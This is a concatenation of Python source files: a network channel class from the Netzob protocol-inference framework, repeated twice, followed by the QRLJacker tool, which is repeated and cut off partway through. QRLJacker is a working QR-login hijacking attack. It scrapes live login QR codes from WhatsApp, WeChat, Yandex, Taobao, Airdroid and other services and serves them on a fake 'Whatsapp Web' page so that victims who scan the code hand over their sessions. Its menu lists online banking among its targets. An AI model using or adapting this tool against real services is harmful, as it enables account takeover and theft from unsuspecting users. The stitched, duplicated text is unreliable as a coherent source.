        """Close the communication channel."""
        if self.__socket is not None:
            self.__socket.close()
        self.isOpen = False

    def read(self, timeout=None):
        """Read the next message on the communication channel.

        @keyword timeout: the maximum time in millisecond to wait before a message can be reached
        @type timeout: :class:`int`
        """
        # TODO: handle timeout
        if self.__socket is not None:
            (data, _) = self.__socket.recvfrom(65535)

            # Remove Ethernet header from received data
            ethHeaderLen = 14  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ethHeaderLen:
                data = data[ethHeaderLen:]

            # Remove IP header from received data
            ipHeaderLen = (data[0] & 15) * 4  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ipHeaderLen:
                data = data[ipHeaderLen:]
            return data
        else:
            raise Exception("socket is not available")

    def writePacket(self, data):
        """Write on the communication channel the specified data

        :parameter data: the data to write on the channel
        :type data: binary object
        """

        if self.header is None:
            raise Exception("IP header structure is None")

        if self.__socket is None:
            raise Exception("socket is not available")

        self.header_presets['ip.payload'] = data
        packet = self.header.specialize(presets=self.header_presets)
        len_data = self.__socket.sendto(packet, (self.interface, RawEthernetClient.ETH_P_ALL))
        return len_data

    @typeCheck(bytes)
    def sendReceive(self, data, timeout=None):
        """Write on the communication channel the specified data and returns the corresponding response

        :parameter data: the data to write on the channel
        :type data: binary object
        @type timeout: :class:`int`
        """
        if self.__socket is not None:
            # get the ports from message to identify the good response (in TCP or UDP)
            portSrcTx = (data[0] * 256) + data[1]
            portDstTx = (data[2] * 256) + data[3]

            responseOk = False
            stopWaitingResponse = False
            self.write(data)
            while stopWaitingResponse is False:
                # TODO: handle timeout
                dataReceived = self.read(timeout)
                portSrcRx = (dataReceived[0] * 256) + dataReceived[1]
                portDstRx = (dataReceived[2] * 256) + dataReceived[3]
                stopWaitingResponse = (portSrcTx == portDstRx) and (portDstTx == portSrcRx)
                if stopWaitingResponse:  # and not timeout
                    responseOk = True
            if responseOk:
                return dataReceived
        else:
            raise Exception("socket is not available")

    def get_interface_addr(self, ifname):
        SIOCGIFHWADDR = 0x8927
        s = socket.socket()
        response = ioctl(s, SIOCGIFHWADDR, struct.pack("16s16x",ifname))
        s.close()
        return struct.unpack("16xh6s8x", response)

    def initHeader(self):
        """Initialize the IP header according to the IP format definition.

        """

        # Ethernet header

        # Retrieve remote MAC address
        dstMacAddr = arpreq.arpreq(self.remoteIP)
        if dstMacAddr is not None:
            dstMacAddr = dstMacAddr.replace(':', '')
            dstMacAddr = binascii.unhexlify(dstMacAddr)
        else:
            # Force ARP resolution
            p = subprocess.Popen("ping -c1 {}".format(self.remoteIP), shell=True)                    
            p.wait()
            time.sleep(0.1)

            dstMacAddr = arpreq.arpreq(self.remoteIP)
            if dstMacAddr is not None:
                dstMacAddr = dstMacAddr.replace(':', '')
                dstMacAddr = binascii.unhexlify(dstMacAddr)
            else:
                raise Exception("Cannot resolve IP address to a MAC address for IP: '{}'".format(self.remoteIP))

        # Retrieve local MAC address
        srcMacAddr = self.get_interface_addr(bytes(self.interface, 'utf-8'))[1]

        eth_dst = Field(name='eth.dst', domain=Raw(dstMacAddr))
        eth_src = Field(name='eth.src', domain=Raw(srcMacAddr))
        eth_type = Field(name='eth.type', domain=Raw(b"\x08\x00"))


        # IP header

        ip_ver = Field(
            name='ip.version', domain=BitArray(
                value=bitarray('0100')))  # IP Version 4
        ip_ihl = Field(name='ip.hdr_len', domain=BitArray(bitarray('0000')))
        ip_tos = Field(
            name='ip.tos',
            domain=Data(
                dataType=BitArray(nbBits=8),
                originalValue=bitarray('00000000'),
                svas=SVAS.PERSISTENT))
        ip_tot_len = Field(
            name='ip.len', domain=BitArray(bitarray('0000000000000000')))
        ip_id = Field(name='ip.id', domain=BitArray(nbBits=16))
        ip_flags = Field(name='ip.flags', domain=Data(dataType=BitArray(nbBits=3), originalValue=bitarray('000'), svas=SVAS.PERSISTENT))
        ip_frag_off = Field(name='ip.fragment', domain=Data(dataType=BitArray(nbBits=13), originalValue=bitarray('0000000000000'), svas=SVAS.PERSISTENT))
        ip_ttl = Field(name='ip.ttl', domain=Data(dataType=BitArray(nbBits=8), originalValue=bitarray('01000000'), svas=SVAS.PERSISTENT))
        ip_proto = Field(name='ip.proto', domain=Integer(value=self.upperProtocol, unitSize=AbstractType.UNITSIZE_8, endianness=AbstractType.ENDIAN_BIG, sign=AbstractType.SIGN_UNSIGNED))
        ip_checksum = Field(name='ip.checksum', domain=BitArray(bitarray('0000000000000000')))
        ip_saddr = Field(name='ip.src', domain=IPv4(self.localIP))
        ip_daddr = Field(
            name='ip.dst', domain=IPv4(self.remoteIP))
        ip_payload = Field(name='ip.payload', domain=Raw())

        ip_ihl.domain = Size([ip_ver,
                              ip_ihl,
                              ip_tos,
                              ip_tot_len,
                              ip_id, ip_flags,
                              ip_frag_off,
                              ip_ttl, ip_proto,
                              ip_checksum,
                              ip_saddr,
                              ip_daddr], dataType=BitArray(nbBits=4), factor=1/float(32))
        ip_tot_len.domain = Size([ip_ver,
                                  ip_ihl,
                                  ip_tos,
                                  ip_tot_len,
                                  ip_id,
                                  ip_flags,
                                  ip_frag_off,
                                  ip_ttl,
                                  ip_proto,
                                  ip_checksum,
                                  ip_saddr,
                                  ip_daddr,
                                  ip_payload], dataType=Integer(unitSize=AbstractType.UNITSIZE_16, sign=AbstractType.SIGN_UNSIGNED), factor=1/float(8))
        ip_checksum.domain = InternetChecksum(fields=[ip_ver,
                                                      ip_ihl,
                                                      ip_tos,
                                                      ip_tot_len,
                                                      ip_id,
                                                      ip_flags,
                                                      ip_frag_off,
                                                      ip_ttl,
                                                      ip_proto,
                                                      ip_checksum,
                                                      ip_saddr,
                                                      ip_daddr], dataType=Raw(nbBytes=2, unitSize=AbstractType.UNITSIZE_16))
        
        self.header = Symbol(name='Ethernet layer', fields=[eth_dst,
                                                            eth_src,
                                                            eth_type,
                                                            ip_ver,
                                                            ip_ihl,
                                                            ip_tos,
                                                            ip_tot_len,
                                                            ip_id,
                                                            ip_flags,
                                                            ip_frag_off,
                                                            ip_ttl,
                                                            ip_proto,
                                                            ip_checksum,
                                                            ip_saddr,
                                                            ip_daddr,
                                                            ip_payload])

    # Management methods

    # Properties

    @property
    def remoteIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__remoteIP

    @remoteIP.setter
    @typeCheck(str)
    def remoteIP(self, remoteIP):
        if remoteIP is None:
            raise TypeError("Listening IP cannot be None")

        self.__remoteIP = remoteIP

    @property
    def localIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__localIP

    @localIP.setter
    @typeCheck(str)
    def localIP(self, localIP):
        self.__localIP = localIP

    @property
    def upperProtocol(self):
        """Upper protocol, such as TCP, UDP, ICMP, etc.

        :type: :class:`str`
        """
        return self.__upperProtocol

    @upperProtocol.setter
    @typeCheck(int)
    def upperProtocol(self, upperProtocol):
        if upperProtocol is None:
            raise TypeError("Upper protocol cannot be None")

        self.__upperProtocol = upperProtocol

    @property
    def interface(self):
        """Interface such as eth0, lo.

        :type: :class:`str`
        """
        return self.__interface

    @interface.setter
    @typeCheck(str)
    def interface(self, interface):
        if interface is None:
            raise TypeError("Interface cannot be None")

        self.__interface = interface

    @property
    def timeout(self):
        return self.__timeout

    @timeout.setter
    @typeCheck(int)
    def timeout(self, timeout):
        self.__timeout = timeout

#-*- coding: utf-8 -*-

#+---------------------------------------------------------------------------+
#|          01001110 01100101 01110100 01111010 01101111 01100010            |
#|                                                                           |
#|               Netzob : Inferring communication protocols                  |
#+---------------------------------------------------------------------------+
#| Copyright (C) 2011-2017 Georges Bossert and Frédéric Guihéry              |
#| This program is free software: you can redistribute it and/or modify      |
#| it under the terms of the GNU General Public License as published by      |
#| the Free Software Foundation, either version 3 of the License, or         |
#| (at your option) any later version.                                       |
#|                                                                           |
#| This program is distributed in the hope that it will be useful,           |
#| but WITHOUT ANY WARRANTY; without even the implied warranty of            |
#| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the              |
#| GNU General Public License for more details.                              |
#|                                                                           |
#| You should have received a copy of the GNU General Public License         |
#| along with this program. If not, see <http://www.gnu.org/licenses/>.      |
#+---------------------------------------------------------------------------+
#| @url      : http://www.netzob.org                                         |
#| @contact  : contact@netzob.org                                            |
#| @sponsors : Amossys, http://www.amossys.fr                                |
#|             Supélec, http://www.rennes.supelec.fr/ren/rd/cidre/           |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| File contributors :                                                       |
#|       - Frédéric Guihéry <frederic.guihery (a) amossys.fr>                |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Standard library imports                                                  |
#+---------------------------------------------------------------------------+
import socket
from bitarray import bitarray
import struct
from fcntl import ioctl
import arpreq
import subprocess
import time
import binascii

#+---------------------------------------------------------------------------+
#| Related third party imports                                               |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Local application imports                                                 |
#+---------------------------------------------------------------------------+
from netzob.Common.Utils.Decorators import typeCheck, NetzobLogger
from netzob.Simulator.Channels.AbstractChannel import AbstractChannel
from netzob.Model.Vocabulary.Field import Field
from netzob.Model.Vocabulary.Symbol import Symbol
from netzob.Model.Types.IPv4 import IPv4
from netzob.Model.Types.Raw import Raw
from netzob.Model.Types.BitArray import BitArray
from netzob.Model.Types.Integer import Integer
from netzob.Model.Types.AbstractType import AbstractType
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Size import Size
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Data import Data
from netzob.Model.Vocabulary.Domain.Variables.Leafs.InternetChecksum import InternetChecksum
from netzob.Model.Vocabulary.Domain.Variables.SVAS import SVAS


@NetzobLogger
class RawEthernetClient(AbstractChannel):
    """A RawEthernetClient is a communication channel allowing to send IP
    payloads. This channel is responsible for building the IP layer.

    Interesting link: http://www.offensivepython.com/2014/09/packet-injection-capturing-response.html

    >>> from netzob.all import *
    >>> client = RawEthernetClient(remoteIP='127.0.0.1')
    >>> client.open()
    >>> symbol = Symbol([Field("Hello Zoby !")])
    >>> client.write(symbol.specialize())
    >>> client.close()

    """

    ETH_P_ALL = 3

    @typeCheck(str, int)
    def __init__(self,
                 remoteIP,
                 localIP=None,
                 upperProtocol=socket.IPPROTO_TCP,
                 interface="eth0",
                 timeout=5):
        super(RawEthernetClient, self).__init__(isServer=False)
        self.remoteIP = remoteIP
        self.localIP = localIP
        self.upperProtocol = upperProtocol
        self.interface = interface
        self.timeout = timeout
        self.__socket = None
        self.header = None  # The IP header symbol format
        self.header_presets = {}  # Dict used to parameterize IP header fields
        self.type = AbstractChannel.TYPE_RAWETHERNETCLIENT

        # Header initialization
        self.initHeader()

    def open(self, timeout=None):
        """Open the communication channel. If the channel is a client, it starts to connect
        to the specified server.
        """

        if self.isOpen:
            raise RuntimeError(
                "The channel is already open, cannot open it again")

        self.__socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(RawEthernetClient.ETH_P_ALL))
        self.__socket.bind((self.interface, RawEthernetClient.ETH_P_ALL))
        self.isOpen = True

    def close(self):
        """Close the communication channel."""
        if self.__socket is not None:
            self.__socket.close()
        self.isOpen = False

    def read(self, timeout=None):
        """Read the next message on the communication channel.

        @keyword timeout: the maximum time in millisecond to wait before a message can be reached
        @type timeout: :class:`int`
        """
        # TODO: handle timeout
        if self.__socket is not None:
            (data, _) = self.__socket.recvfrom(65535)

            # Remove Ethernet header from received data
            ethHeaderLen = 14  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ethHeaderLen:
                data = data[ethHeaderLen:]

            # Remove IP header from received data
            ipHeaderLen = (data[0] & 15) * 4  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ipHeaderLen:
                data = data[ipHeaderLen:]
            return data
        else:
            raise Exception("socket is not available")

    def writePacket(self, data):
        """Write on the communication channel the specified data

        :parameter data: the data to write on the channel
        :type data: binary object
        """

        if self.header is None:
            raise Exception("IP header structure is None")

        if self.__socket is None:
            raise Exception("socket is not available")

        self.header_presets['ip.payload'] = data
        packet = self.header.specialize(presets=self.header_presets)
        len_data = self.__socket.sendto(packet, (self.interface, RawEthernetClient.ETH_P_ALL))
        return len_data

    @typeCheck(bytes)
    def sendReceive(self, data, timeout=None):
        """Write on the communication channel the specified data and returns the corresponding response

        :parameter data: the data to write on the channel
        :type data: binary object
        @type timeout: :class:`int`
        """
        if self.__socket is not None:
            # get the ports from message to identify the good response (in TCP or UDP)
            portSrcTx = (data[0] * 256) + data[1]
            portDstTx = (data[2] * 256) + data[3]

            responseOk = False
            stopWaitingResponse = False
            self.write(data)
            while stopWaitingResponse is False:
                # TODO: handle timeout
                dataReceived = self.read(timeout)
                portSrcRx = (dataReceived[0] * 256) + dataReceived[1]
                portDstRx = (dataReceived[2] * 256) + dataReceived[3]
                stopWaitingResponse = (portSrcTx == portDstRx) and (portDstTx == portSrcRx)
                if stopWaitingResponse:  # and not timeout
                    responseOk = True
            if responseOk:
                return dataReceived
        else:
            raise Exception("socket is not available")

    def get_interface_addr(self, ifname):
        SIOCGIFHWADDR = 0x8927
        s = socket.socket()
        response = ioctl(s, SIOCGIFHWADDR, struct.pack("16s16x",ifname))
        s.close()
        return struct.unpack("16xh6s8x", response)

    def initHeader(self):
        """Initialize the IP header according to the IP format definition.

        """

        # Ethernet header

        # Retrieve remote MAC address
        dstMacAddr = arpreq.arpreq(self.remoteIP)
        if dstMacAddr is not None:
            dstMacAddr = dstMacAddr.replace(':', '')
            dstMacAddr = binascii.unhexlify(dstMacAddr)
        else:
            # Force ARP resolution
            p = subprocess.Popen("ping -c1 {}".format(self.remoteIP), shell=True)                    
            p.wait()
            time.sleep(0.1)

            dstMacAddr = arpreq.arpreq(self.remoteIP)
            if dstMacAddr is not None:
                dstMacAddr = dstMacAddr.replace(':', '')
                dstMacAddr = binascii.unhexlify(dstMacAddr)
            else:
                raise Exception("Cannot resolve IP address to a MAC address for IP: '{}'".format(self.remoteIP))

        # Retrieve local MAC address
        srcMacAddr = self.get_interface_addr(bytes(self.interface, 'utf-8'))[1]

        eth_dst = Field(name='eth.dst', domain=Raw(dstMacAddr))
        eth_src = Field(name='eth.src', domain=Raw(srcMacAddr))
        eth_type = Field(name='eth.type', domain=Raw(b"\x08\x00"))


        # IP header

        ip_ver = Field(
            name='ip.version', domain=BitArray(
                value=bitarray('0100')))  # IP Version 4
        ip_ihl = Field(name='ip.hdr_len', domain=BitArray(bitarray('0000')))
        ip_tos = Field(
            name='ip.tos',
            domain=Data(
                dataType=BitArray(nbBits=8),
                originalValue=bitarray('00000000'),
                svas=SVAS.PERSISTENT))
        ip_tot_len = Field(
            name='ip.len', domain=BitArray(bitarray('0000000000000000')))
        ip_id = Field(name='ip.id', domain=BitArray(nbBits=16))
        ip_flags = Field(name='ip.flags', domain=Data(dataType=BitArray(nbBits=3), originalValue=bitarray('000'), svas=SVAS.PERSISTENT))
        ip_frag_off = Field(name='ip.fragment', domain=Data(dataType=BitArray(nbBits=13), originalValue=bitarray('0000000000000'), svas=SVAS.PERSISTENT))
        ip_ttl = Field(name='ip.ttl', domain=Data(dataType=BitArray(nbBits=8), originalValue=bitarray('01000000'), svas=SVAS.PERSISTENT))
        ip_proto = Field(name='ip.proto', domain=Integer(value=self.upperProtocol, unitSize=AbstractType.UNITSIZE_8, endianness=AbstractType.ENDIAN_BIG, sign=AbstractType.SIGN_UNSIGNED))
        ip_checksum = Field(name='ip.checksum', domain=BitArray(bitarray('0000000000000000')))
        ip_saddr = Field(name='ip.src', domain=IPv4(self.localIP))
        ip_daddr = Field(
            name='ip.dst', domain=IPv4(self.remoteIP))
        ip_payload = Field(name='ip.payload', domain=Raw())

        ip_ihl.domain = Size([ip_ver,
                              ip_ihl,
                              ip_tos,
                              ip_tot_len,
                              ip_id, ip_flags,
                              ip_frag_off,
                              ip_ttl, ip_proto,
                              ip_checksum,
                              ip_saddr,
                              ip_daddr], dataType=BitArray(nbBits=4), factor=1/float(32))
        ip_tot_len.domain = Size([ip_ver,
                                  ip_ihl,
                                  ip_tos,
                                  ip_tot_len,
                                  ip_id,
                                  ip_flags,
                                  ip_frag_off,
                                  ip_ttl,
                                  ip_proto,
                                  ip_checksum,
                                  ip_saddr,
                                  ip_daddr,
                                  ip_payload], dataType=Integer(unitSize=AbstractType.UNITSIZE_16, sign=AbstractType.SIGN_UNSIGNED), factor=1/float(8))
        ip_checksum.domain = InternetChecksum(fields=[ip_ver,
                                                      ip_ihl,
                                                      ip_tos,
                                                      ip_tot_len,
                                                      ip_id,
                                                      ip_flags,
                                                      ip_frag_off,
                                                      ip_ttl,
                                                      ip_proto,
                                                      ip_checksum,
                                                      ip_saddr,
                                                      ip_daddr], dataType=Raw(nbBytes=2, unitSize=AbstractType.UNITSIZE_16))
        
        self.header = Symbol(name='Ethernet layer', fields=[eth_dst,
                                                            eth_src,
                                                            eth_type,
                                                            ip_ver,
                                                            ip_ihl,
                                                            ip_tos,
                                                            ip_tot_len,
                                                            ip_id,
                                                            ip_flags,
                                                            ip_frag_off,
                                                            ip_ttl,
                                                            ip_proto,
                                                            ip_checksum,
                                                            ip_saddr,
                                                            ip_daddr,
                                                            ip_payload])

    # Management methods

    # Properties

    @property
    def remoteIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__remoteIP

    @remoteIP.setter
    @typeCheck(str)
    def remoteIP(self, remoteIP):
        if remoteIP is None:
            raise TypeError("Listening IP cannot be None")

        self.__remoteIP = remoteIP

    @property
    def localIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__localIP

    @localIP.setter
    @typeCheck(str)
    def localIP(self, localIP):
        self.__localIP = localIP

    @property
    def upperProtocol(self):
        """Upper protocol, such as TCP, UDP, ICMP, etc.

        :type: :class:`str`
        """
        return self.__upperProtocol

    @upperProtocol.setter
    @typeCheck(int)
    def upperProtocol(self, upperProtocol):
        if upperProtocol is None:
            raise TypeError("Upper protocol cannot be None")

        self.__upperProtocol = upperProtocol

    @property
    def interface(self):
        """Interface such as eth0, lo.

        :type: :class:`str`
        """
        return self.__interface

    @interface.setter
    @typeCheck(str)
    def interface(self, interface):
        if interface is None:
            raise TypeError("Interface cannot be None")

        self.__interface = interface

    @property
    def timeout(self):
        return self.__timeout

    @timeout.setter
    @typeCheck(int)
    def timeout(self, timeout):
        self.__timeout = timeout

#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser                    
from selenium import webdriver                    
from binascii import a2b_base64
from PIL import Image                    

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")                    
		else:                    
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")                    
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [+]Opening Mozila FireFox..."
		return web                    
	except:
		web = webdriver.Chrome()                    
		print " [+]Opening Google Chrome..."                    
		return web                    

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [+]The QR code image found !"
			print " [+]Downloading the image.."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [#]Saved To tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make("svg")
def Yandex():
	print "\n-- --- -- --- -- --- -- --- -- --- --"
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://passport.yandex.com/auth?mode=qr")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [+]The QR code image found !"
			data = urllib.urlopen(img_url).read()
			print " [+]Downloading the image.."
			f = open("tmp.svg","w").write(data)
			print " [#]Saved To tmp.svg"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://web.airdroid.com")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			if refresh == 0:
				print " [!]Refreshing page..."
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://weibo.com/login.php")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://web.wechat.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://w.qq.com")
	time.sleep(10)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("img")[0]
			print " [+]The QR code image found !"
			location = img.location
			size = img.size
			print " [+]Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [#]Saved To tmp.png"
			webdriver.delete_all_cookies()
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://login.taobao.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button_class = web.find_element_by_class_name("msg-err")
			button = button_class.find_elements_by_tag_name("a")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def make(typ="html"):
	if typ == "html":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></center>
</body></html>"""

	if typ == "svg":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id="qrcodew" data="tmp.svg" type="image/svg+xml"></object></center>
</body></html>"""
	f = open("index.html","w")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get(url)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(s)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def clear():                    
	if os.name == "nt":                    
		os.system("cls")                    
	else:                    
		os.system("clear")                    

def main():
	#clear()
	print """\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
"""
	choice = input(" Choice > ")

	#Chat Applications
	if choice == 1:
		print """
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	"""

		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make("svg")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Passport Services
	if choice == 5:
		print """
 1.Yandex Passport
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Mobile Management Software
	if choice == 6:
		print """
 1.Airdroid
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Customization
	#if choice == 8:
		#settings.read("Data/Simple.ini")
		#url = settings.get("WeChat","url")
		#image_number = settings.get("WeChat","image_number")
		#classname = settings.get("WeChat","classname")
if __name__ == '__main__':
	main()

#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser                    
from selenium import webdriver                    
from binascii import a2b_base64
from PIL import Image                    

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")                    
